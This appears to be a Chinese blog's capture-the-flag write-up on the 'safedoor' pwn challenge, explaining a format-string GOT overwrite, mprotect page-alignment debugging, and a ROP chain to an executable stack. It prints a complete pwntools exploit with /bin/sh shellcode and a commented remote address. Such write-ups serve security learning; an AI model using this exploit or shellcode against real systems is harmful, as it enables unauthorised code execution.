<p>当时拿到这道题目以后，想法很简单。使用fmt将puts函数的got改掉换成程序自带的mprotect后门（如图）。先是用mprotect将栈空间段设置为可执行，然后利用gets函数将shellcode放入站上，由于最后没有将eax清空，eax寄存器仍然保存着栈地址，所以我们可以利用 jmp eax 或者 call eax 跳转到栈上执行。（一个简单的pwn案例）<br> <a id="more"></a><br><img src="/2016/05/18/mprotect/1.png" alt="1.png" title=""></p>
<p>HOWEVER，说好的flag呢！？为什么mprotect函数执行后总是返回-1 ！？<br><img src="/2016/05/18/mprotect/4.jpg" alt="4.jpg" title=""></p>
<img src="/2016/05/18/mprotect/2.jpg" alt="2.jpg" title="">
<p>一脸蒙蔽<br><img src="/2016/05/18/mprotect/3.jpg" alt="3.jpg" title=""><br>一定是我打开方式不对。。这个要先等等，然后再开。。没准就弹个shell给我了。嗯，我信了。</p>
<p>于是各种调试脚本。。。然并软，其中有一次竟然弹给我shell了。。这特么还有概率弹shell的啊，我特么第一次碰到啊。。</p>
<p>查了很多资料。<br>发现mprotect操作的前两个参数有具体限制的。</p>
<img src="/2016/05/18/mprotect/5.png" alt="5.png" title="">
<p>来源于：<a href="http://blog.csdn.net/u010651541/article/details/49913029" target="_blank" rel="external">http://blog.csdn.net/u010651541/article/details/49913029</a></p>
<p>接着，动态调试下。</p>
<img src="/2016/05/18/mprotect/6.jpg" alt="6.jpg" title="">
<p>这边的第一个参数addr明显没有内存页对齐，用<code>si</code>跟进函数内部。</p>
<p>这边等dl_resolve操作完成之后，用<code>print mprotect</code>打印出mprotect函数在libc中的地址，然后下断点。再<code>c</code> 在执行到mprotect函数的位置停下。</p>
<img src="/2016/05/18/mprotect/7.png" alt="7.png" title="">
<img src="/2016/05/18/mprotect/8.png" alt="8.png" title="">
<p>继续跟进。发现在进行<code>syscall</code>系统调用mprotect之后，eax返回了两种不同结果，第一种结果是参数为(0xffe05390,0x80,0x7)的情况，第二种结果是参数为(0xffe05000,0x1000,0x7)的情况，可以发现在内存页对齐的情况下，成功带回eax=0。（这边不知道怎么跟进内核查看，求教大神）</p>
<img src="/2016/05/18/mprotect/9.png" alt="9.png" title="">
<img src="/2016/05/18/mprotect/10.png" alt="10.png" title="">
<p>接下来，由于mprotect函数之后gets函数没有限制输入字符的长度，我们可以进行面向返回的编程（rop），将栈上的空间设置为可读可写可执行，并将shellcode放在该栈空间上，最后跳转至该栈空间进行shellcode的执行。</p>
<p>exp如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">'./safedoor'</span>)</div><div class="line">context(log_level=<span class="string">'debug'</span>)</div><div class="line"></div><div class="line"><span class="comment"># p = remote('219.146.15.117',8000)</span></div><div class="line">elf = ELF(<span class="string">'safedoor'</span>)</div><div class="line">puts_got = elf.got[<span class="string">'puts'</span>]</div><div class="line">mprotect_plt = elf.symbols[<span class="string">'mprotect'</span>]</div><div class="line">gets_plt = elf.symbols[<span class="string">'gets'</span>]</div><div class="line"></div><div class="line">ppp_ret = <span class="number">0x080486cd</span></div><div class="line">p_ret = <span class="number">0x080483e1</span></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'KEY:'</span>)</div><div class="line">m_p = <span class="number">0x0804858D</span></div><div class="line">page_size = <span class="number">4096</span></div><div class="line"><span class="comment"># x&amp;~(page_size-1)</span></div><div class="line"></div><div class="line"></div><div class="line">gdb.attach(p,<span class="string">'b* 0x0804858D\nc'</span>)</div><div class="line">payload = <span class="string">"%70$p..."</span></div><div class="line">p.sendline(payload)</div><div class="line">ebp = p.recvuntil(<span class="string">'...'</span>)[<span class="number">8</span>:<span class="number">16</span>]</div><div class="line">ebp_addr= int(ebp,<span class="number">16</span>)</div><div class="line">shellcode_addr  = (ebp_addr<span class="number">-296</span><span class="number">-0x98</span>)&amp;~(page_size<span class="number">-1</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">2</span>):</div><div class="line">	l = (m_p &gt;&gt; (x*<span class="number">8</span>)) &amp;<span class="number">0xff</span></div><div class="line">	payload = p32(puts_got+x)+<span class="string">"%%%dc"</span>%(l<span class="number">-4</span>)+<span class="string">"%4$hhn..."</span></div><div class="line">	p.sendline(payload)</div><div class="line">	p.recvuntil(<span class="string">'...'</span>)</div><div class="line">l = (m_p &gt;&gt; (<span class="number">2</span>*<span class="number">8</span>)) &amp;<span class="number">0xff</span></div><div class="line">payload = p32(puts_got+<span class="number">2</span>)+<span class="string">"%4$hhn..."</span></div><div class="line">p.sendline(payload)</div><div class="line">p.recvuntil(<span class="string">'...'</span>)</div><div class="line">l = (m_p &gt;&gt; (<span class="number">3</span>*<span class="number">8</span>)) &amp;<span class="number">0xff</span></div><div class="line">payload = p32(puts_got+<span class="number">3</span>)+<span class="string">"%%%dc"</span>%(l<span class="number">-4</span>)+<span class="string">"%4$hhn..."</span></div><div class="line">p.sendline(payload)</div><div class="line">p.recvuntil(<span class="string">'...'</span>)</div><div class="line">p.sendline(<span class="string">'STjJaOEwLszsLwRy'</span>)</div><div class="line">p.recvuntil(<span class="string">'\nKEY:'</span>)</div><div class="line">shellcode =  <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"</span></div><div class="line">payload1 = <span class="string">'A'</span>*(<span class="number">140</span>)+p32(mprotect_plt)+p32(ppp_ret)+p32(shellcode_addr)+p32(page_size)+p32(<span class="number">7</span>)+p32(gets_plt)+p32(p_ret)+p32(shellcode_addr)+p32(shellcode_addr)</div><div class="line">p.sendline(payload1)</div><div class="line">p.sendline(shellcode)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>题目地址:<a href="https://github.com/Winter3un/ctf_task" target="_blank" rel="external">https://github.com/Winter3un/ctf_task</a></p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
        </tags>
        
    </entry>
    
  
  
    
    <entry>
      <title><![CDATA[about]]></title>
      <url>/about/index.html</url>
      <content type="html"><![CDATA[<p>曾实习于安恒、参与G20渗透测试项目、原Mirage队长、CTF玩家、网络安全研究员、pwner、半赛棍、浙警院13级学生、现行踪成谜</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[tags]]></title>
      <url>/tags/index.html</url>
      <content type="html"></content>
    </entry>
    
  
</search>
